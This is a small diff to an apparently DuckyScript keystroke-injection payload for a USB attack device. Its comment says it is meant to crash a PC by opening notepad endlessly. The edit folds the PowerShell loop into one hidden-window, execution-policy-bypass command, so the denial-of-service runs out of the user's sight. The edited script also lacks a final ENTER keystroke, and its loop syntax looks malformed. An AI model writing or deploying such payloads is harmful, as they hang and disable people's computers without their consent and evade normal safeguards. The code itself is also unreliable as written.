@@ -1,7 +1,4 @@
 REM crash pc by opening notepad a lot of times
 GUI r
 DELAY 500
-STRING powershell 
-DELAY 2000
-STRING for (1) { Start-process "notepad" }
-ENTER
+STRING powershell -w h -NoP -Ep Bypass -command  for (1) { Start-process "notepad" }
